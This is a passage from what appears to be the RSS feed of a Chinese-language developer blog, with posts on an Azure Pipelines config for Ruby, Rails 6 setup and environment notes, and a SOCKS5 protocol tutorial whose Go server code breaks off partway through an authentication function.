&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="c"># Ruby&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Package your Ruby project.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Add steps that install rails, analyze code, save build artifacts, deploy, and more:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># https://docs.microsoft.com/azure/devops/pipelines/languages/ruby&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">trigger&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">branches&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># 只有以下分支提交才会触发CICD&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">include&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">master&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">sdtttttt&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">CICD&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">depend*&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">paths&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># 只有以下文件提交时不触发CICD&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">exclude&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">README.md&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">appveyor.yml&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">pool&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">vmImage&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;ubuntu-18.04&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">steps&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>- &lt;span class="nt">task&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">UseRubyVersion@0&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">inputs&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># 天杀的，微软提供的Ubuntu 镜像已经不支持 Ruby2.6.3&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">versionSpec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;= 2.6.3&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># Rails 内置数据库 SQLite3 需要依赖以下工具&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>- &lt;span class="nt">script&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">sudo apt-get -yqq install libsqlite3-dev libpq-dev&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">displayName&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">install sqlite3&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>- &lt;span class="nt">script&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="sd">
&lt;/span>&lt;span class="sd"> gem install bundler
&lt;/span>&lt;span class="sd"> bundle install --retry=3 --jobs=4&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">displayName&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;bundle install&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>- &lt;span class="nt">script&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">bundle exec rake&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">displayName&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;bundle exec rake&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Rails Development</title><link>https://sdttttt.github.io/blog/rails_development/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://sdttttt.github.io/blog/rails_development/</guid><description>
&lt;h3 id="webpacker">Webpacker&lt;/h3>
&lt;p>Rails 6版本开始依赖Webpacker，在运行之前必须先安装Webpacker这玩意。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-shell" data-lang="shell">rails webpacker:install
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>如果需要安装前端框架，请使用yarn来安装，这样部署的时候能享受到webpacker打包便利。&lt;/p>
&lt;h3 id="production">production&lt;/h3>
&lt;p>Rails 6 启动时需要一串Key作为加密的salt，key不能随意生成。
生成key时，请删除config下的credentials.enc.yml 和 master.key 文件。
然后运行&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-shell" data-lang="shell">rails credentials:edit
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后Rails访问静态资源，需要使用webpacker打包编译后的资产。
运行&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-shell" data-lang="shell">rails assets:precompile
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Rails 6 在生产环境下认为你使用 Apache 和 Nginx 缓存编译后的静态资产。如果你不使用他们，需要&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-ruby" data-lang="ruby">&lt;span class="c1"># config/environments/production.rb&lt;/span>
&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">public_file_server&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">enabled&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kp">true&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>记住，打包之后的js以及css统一叫application.js/css 在view页面引用时需要引用application这个名字。其他的会报错&lt;/p></description></item><item><title>Rails ENV</title><link>https://sdttttt.github.io/blog/ror_environment_config/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://sdttttt.github.io/blog/ror_environment_config/</guid><description>
&lt;h1 id="rails-env">Rails ENV&lt;/h1>
&lt;p>环境配置参考 Ruby China 社区的 Wiki&lt;/p>
&lt;h3 id="windows-10">Windows 10&lt;/h3>
&lt;p>在 Windowns 10 的环境下和Linux上差不多，不过不需要RVM&lt;/p>
&lt;ul>
&lt;li>首先在Ruby官方网站下载好安装包&lt;/li>
&lt;li>之后使用RubyChina提供的Source替换Gem的Source&lt;/li>
&lt;li>之后使用Gem下载 Bundler 和 Rails&lt;/li>
&lt;li>创建Rails项目运行即可&lt;/li>
&lt;/ul>
&lt;p>有一个软件叫做 &lt;code>RailsInstaller&lt;/code> 可以直接帮你省下1和3步也就是直接帮你安装好了Ruby和Rails还有Gem，bundler。
但是🙅我目前使用的Railsinstaller有点问题。他的Ruby版本是2.3，rails版本是5，rails5依赖的是 &amp;gt;= 2.4版本的ruby，这就有问题了。我也没接着用这个软件了。&lt;/p>
&lt;p>在rails6中加入了&lt;code>Webpacker&lt;/code>的打包工具，运行之前需要先安装webpacker不然会报错。 &lt;code>$ rails webpacker:install&lt;/code>&lt;/p>
&lt;p>注意在上面可能会有点问题，Gem创建Rails项目的时候会下载各种依赖，这些依赖有可能会在Windows的环境上出现问题，比如我遇到的 SQLite3,所以Ruby最好还是不要在Windowns上运行。&lt;/p>
&lt;p>还有Rails 是要依赖 Yarn和 nodejs 最好是10版本以上&lt;/p>
&lt;h2 id="development-note">Development Note&lt;/h2>
&lt;p>花了很长时间去吧Rails和一些大前端的框架合二为一，最后以失败而告终。
Rails终究是个全栈式的Web框架，老老实实用简单的就行。&lt;/p>
&lt;ul>
&lt;li>Bootstrap Configuration&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-ruby" data-lang="ruby">&lt;span class="c1"># =&amp;gt; 首先在 Gemfile 中加入&lt;/span>
&lt;span class="n">gem&lt;/span> &lt;span class="s1">&amp;#39;bootstrap&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;~&amp;gt; 4.3.1&amp;#39;&lt;/span>
&lt;span class="n">gem&lt;/span> &lt;span class="s1">&amp;#39;jquery-rails&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>之后将&lt;code>app\assets\stylesheets\application.css&lt;/code> 改为 scss&lt;/p>
&lt;p>删掉所有的东西包括注释&lt;/p>
&lt;p>加入&lt;code>@import &amp;ldquo;bootstrap&amp;rdquo;;&lt;/code>&lt;/p>
&lt;hr>
&lt;h2 id="ruby-note-todo">Ruby Note Todo&lt;/h2>
&lt;pre>&lt;code>Error running 'requirements_debian_libs_install g++ gcc autoconf automake bison libc6-dev libffi-dev libgdbm-dev libncurses5-dev libsqlite3-dev libtool libyaml-dev make pkg-config sqlite3 zlib1g-dev libgmp-dev libreadline-dev libssl-dev',
please read /home/sdttttt/.rvm/log/1573869340/package_install_g++_gcc_autoconf_automake_bison_libc6-dev_libffi-dev_libgdbm-dev_libncurses5-dev_libsqlite3-dev_libtool_libyaml-dev_make_pkg-config_sqlite3_zlib1g-dev_libgmp-dev_libreadline-dev_libssl-dev.log
Requirements installation failed with status: 100.
&lt;/code>&lt;/pre>&lt;p>碰到这种错误不需要紧张，&lt;code>rvm requirements&lt;/code> command 的原理就是会使用你系统的包管理工具去下载这些依赖，所以原因很简单，你的源里找不到这些依赖就会报出100的错误。
是Ubuntu的话下面我提供了源&lt;/p>
&lt;pre>&lt;code>#添加阿里源
deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
&lt;/code>&lt;/pre></description></item><item><title>Socks5</title><link>https://sdttttt.github.io/blog/socks5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://sdttttt.github.io/blog/socks5/</guid><description>
&lt;p>SOCKS 是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递，SOCKS 是&amp;quot;SOCKetS&amp;quot;的缩写。
SOCKS5 是 SOCKS4 的升级版，其主要多了鉴定、IPv6、UDP 支持。&lt;/p>
&lt;p>SOCKS5 协议可以分为三个部分：&lt;/p>
&lt;ul>
&lt;li>(1) 协议版本及认证方式&lt;/li>
&lt;li>(2) 根据认证方式执行对应的认证&lt;/li>
&lt;li>(3) 请求信息&lt;/li>
&lt;/ul>
&lt;h4 id="1协议版本及认证方式">（1）协议版本及认证方式&lt;/h4>
&lt;p>创建与 SOCKS5 服务器的 TCP 连接后&lt;strong>客户端&lt;/strong>需要先发送请求来协议版本及认证方式，&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>VER&lt;/th>
&lt;th>NMETHODS&lt;/th>
&lt;th>METHODS&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1-255&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>
&lt;p>VER 是 SOCKS 版本，这里应该是 0x05；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>NMETHODS 是 METHODS 部分的长度；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>METHODS 是客户端支持的认证方式列表，每个方法占 1 字节。当前的定义是：&lt;/p>
&lt;ul>
&lt;li>0x00 不需要认证&lt;/li>
&lt;li>0x01 GSSAPI&lt;/li>
&lt;li>0x02 用户名、密码认证&lt;/li>
&lt;li>0x03 - 0x7F 由 IANA 分配（保留）&lt;/li>
&lt;li>0x80 - 0xFE 为私人方法保留&lt;/li>
&lt;li>0xFF 无可接受的方法&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>服务器&lt;/strong>回复客户端可用方法：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>VER&lt;/th>
&lt;th>METHOD&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>VER 是 SOCKS 版本，这里应该是 0x05；&lt;/li>
&lt;li>METHOD 是服务端选中的方法。如果返回 0xFF 表示没有一个认证方法被选中，客户端需要关闭连接。&lt;/li>
&lt;/ul>
&lt;p>代码实现：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-golang" data-lang="golang">&lt;span class="kd">type&lt;/span> &lt;span class="nx">ProtocolVersion&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">VER&lt;/span> &lt;span class="kt">uint8&lt;/span>
&lt;span class="nx">NMETHODS&lt;/span> &lt;span class="kt">uint8&lt;/span>
&lt;span class="nx">METHODS&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">uint8&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">ProtocolVersion&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">handshake&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">conn&lt;/span> &lt;span class="nx">net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Conn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">b&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">([]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">255&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">n&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">conn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">VER&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c1">//ReadByte reads and returns a single byte，第一个参数为socks的版本号
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">NMETHODS&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c1">//nmethods是记录methods的长度的。nmethods的长度是1个字节
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="nx">n&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">NMETHODS&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;协议错误, sNMETHODS不对&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">METHODS&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">NMETHODS&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c1">//读取指定长度信息，读取正好len(buf)长度的字节。如果字节数不是指定长度，则返回错误信息和正确的字节数
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">VER&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">5&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">errors&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">New&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;该协议不是socks5协议&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">//服务器回应客户端消息:
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//第一个参数表示版本号为5，即socks5协议，
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 第二个参数表示服务端选中的认证方法，0即无需密码访问, 2表示需要用户名和密码进行验证。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">resp&lt;/span> &lt;span class="o">:=&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="nx">conn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">resp&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="2根据认证方式执行对应的认证">（2）根据认证方式执行对应的认证&lt;/h4>
&lt;p>SOCKS5 协议提供 5 种认证方式：&lt;/p>
&lt;ul>
&lt;li>0x00 不需要认证&lt;/li>
&lt;li>0x01 GSSAPI&lt;/li>
&lt;li>0x02 用户名、密码认证&lt;/li>
&lt;li>0x03 - 0x7F 由 IANA 分配（保留）&lt;/li>
&lt;li>0x80 - 0xFE 为私人方法保留&lt;/li>
&lt;/ul>
&lt;p>这里就主要介绍用户名、密码认证。
在客户端、服务端协商使用用户名密码认证后，客户端发出用户名密码：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>鉴定协议版本&lt;/th>
&lt;th>用户名长度&lt;/th>
&lt;th>用户名&lt;/th>
&lt;th>密码长度&lt;/th>
&lt;th>密码&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>动态&lt;/td>
&lt;td>1&lt;/td>
&lt;td>动态&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>服务器鉴定后发出如下回应：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>鉴定协议版本&lt;/th>
&lt;th>鉴定状态&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>其中鉴定状态 0x00 表示成功，0x01 表示失败。&lt;/p>
&lt;p>代码实现：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-golang" data-lang="golang">&lt;span class="kd">type&lt;/span> &lt;span class="nx">Socks5Auth&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">VER&lt;/span> &lt;span class="kt">uint8&lt;/span>
&lt;span class="nx">ULEN&lt;/span> &lt;span class="kt">uint8&lt;/span>
&lt;span class="nx">UNAME&lt;/span> &lt;span class="kt">string&lt;/span>
&lt;span class="nx">PLEN&lt;/span> &lt;span class="kt">uint8&lt;/span>
&lt;span class="nx">PASSWD&lt;/span> &lt;span class="kt">string&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Socks5Auth&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">authenticate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">conn&lt;/span> &lt;span class="nx">net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Conn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">b&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">([]&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">128&lt;/span>&lt;span class="p">)&lt;/span>
